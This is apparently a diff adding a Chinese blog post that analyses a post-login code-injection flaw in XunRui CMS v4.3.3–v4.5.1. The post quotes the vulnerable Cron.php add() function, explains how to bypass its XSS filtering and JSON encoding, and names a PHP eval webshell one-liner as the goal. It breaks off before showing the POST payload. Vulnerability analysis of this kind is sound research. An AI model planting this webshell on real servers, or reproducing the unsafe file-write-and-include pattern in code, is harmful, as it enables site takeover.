@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='触发条件 两个条件: 1.迅睿CMS 版本为v4.3.3到v4.5.1 2.登录后台,且为管理员或具有&amp;quot;应用&amp;quot;-&amp;gt;&amp;ldq'><title>迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)</title>
+
+<link rel='canonical' href='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)'>
+<meta property='og:description' content='触发条件 两个条件: 1.迅睿CMS 版本为v4.3.3到v4.5.1 2.登录后台,且为管理员或具有&amp;quot;应用&amp;quot;-&amp;gt;&amp;ldq'>
+<meta property='og:url' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/'>
+<meta property='og:site_name' content='Weltolk'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='expliot-db' /><meta property='article:published_time' content='2022-04-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db.png' />
+<meta name="twitter:title" content="迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)">
+<meta name="twitter:description" content="触发条件 两个条件: 1.迅睿CMS 版本为v4.3.3到v4.5.1 2.登录后台,且为管理员或具有&amp;quot;应用&amp;quot;-&amp;gt;&amp;ldq"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db.png' />
+    <link rel="shortcut icon" href="/img/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/postgraduate_hu70b388befb54006d4dcf3b6c8c0484a4_1176591_300x0_resize_box_3.png" width="300"
+                            height="225" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Weltolk</a></h1>
+            <h2 class="site-description">2u94 4 4un</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Weltolk'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://weltolk.github.io/" selected>English</option>
+                        
+                            <option value="https://weltolk.github.io/zh-cn/" >中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png"
+                        srcset="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png 800w, /p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="240" 
+                        loading="lazy"
+                        alt="Featured image of post 迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/expliot-db/" >
+                expliot-db
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 26, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    9 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="触发条件">触发条件</h2>
+<p>两个条件:</p>
+<p>1.迅睿CMS 版本为v4.3.3到v4.5.1</p>
+<p>2.登录后台,且为管理员或具有&quot;应用&quot;-&gt;&ldquo;任务队列&quot;的管理权限</p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Admin控制器文件夹下Cron.php控制器的add()函数对于用户的输入没有进行专门的过滤,致使攻击者在具备管理员权限或具有&quot;应用&rdquo;-&gt;&ldquo;任务队列&quot;的管理权限时可以对<code>WRITEPATH.'config/cron.php'</code>文件写入任意内容,同时该文件有多处被包含且可以被利用的点,正常情况下具有上述的触发条件即可稳定触发该漏洞</p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<h3 id="在版本v433之前">在版本v4.3.3之前</h3>
+<p>在版本v4.3.3之前,cron.php下并未有add()函数</p>
+<h3 id="在版本v433到v450下">在版本v4.3.3到v4.5.0下</h3>
+<p>1.该cms在具备上述权限的情况下,可以通过<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>调用Admin控制器文件夹下Cron.php控制器的add()函数</p>
+<p>2.add()函数的代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 任务类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">add</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;设置自定义任务类型&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;操作成功&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;cron_add.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="add函数的分析">add()函数的分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>add()函数首先会在<code>WRITEPATH.'config/cron.php'</code>文件存在时包含该文件,<code>WRITEPATH</code>可在网站根目录的index.php里配置,默认情况下为网站根目录下的<code>cache/</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后add()函数通过<code>json_decode($json, true)</code>函数给<code>$data</code>赋值<code>Null</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">){}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后进入一个if分支语句,当<code>IS_AJAX_POST</code>时,则执行相关的写入文件的代码,否则则跳过写入文件,显示Cron的添加页面,随即结束add()函数,<code>IS_AJAX_POST</code>定义为当收到post请求且post的内容不为空时即返回<code>TRUE</code>,否则返回<code>FALSE</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>if语句中,首先<code>\Phpcmf\Service::L('input')-&gt;post('data', true)</code>该代码通过调用Input.php文件里定义的Input类的post()函数,在接收到post请求且存在key为<code>data</code>时进行xss清洗然后返回,否则直接返回<code>false</code>,然后赋值给<code>$post</code>,xss清洗的代码比较长,我放在本文章的最后,此处的xss清洗可以轻易的绕过,从而达到写入我们想要的任意内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>if语句中,接收完post请求,即将接收到的内容通过json编码后写入<code>WRITEPATH.'config/cron.php'</code>文件,可控的写入点位于字符串<code>$json</code>的赋值中,且在两个<code>'</code>的包裹中,此处是漏洞产生的主要原因,未对用户的输入做足够的判断或清洗即写入相应的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;设置自定义任务类型&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;操作成功&#39;</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>if语句的最后,写入日志并显示操作结果,随即显示cron添加界面,add()函数结束</p>
+<h4 id="绕过json编码和xss清洗以及writepathconfigcronphp文件中的包裹">绕过json编码和xss清洗以及<code>WRITEPATH.'config/cron.php'</code>文件中<code>'</code>的包裹</h4>
+<p>通过前文的分析,我们可以发现,add()函数对用户的输入基本没有特殊的防范,只要绕过xss清洗和json编码以及<code>WRITEPATH.'config/cron.php'</code>文件中<code>'</code>的包裹即可写入我们想要的任意内容</p>
+<p>以下是我的一种方法,在<code>WRITEPATH.'config/cron.php'</code>文件中写入了当运行<code>WRITEPATH.'config/cron.php'</code>文件时在网站根目录写一个名为webshell.php,内容为<code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code>的php语句</p>
+<p>注意下述操作需要先获取csrf_test_name,获取方法:</p>
+<p>1.访问<code>http://host:port/Admin.php?c=Cron&amp;m=add</code></p>
+<p>2.抓包当点击&quot;保存&quot;时发送的post包</p>
+<p>3.post的内容里的csrf_test_name即可一直用作一段时间内的csrf_test_name</p>
+<p>获取到csrf_test_name之后,给<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>post以下内容:</p>
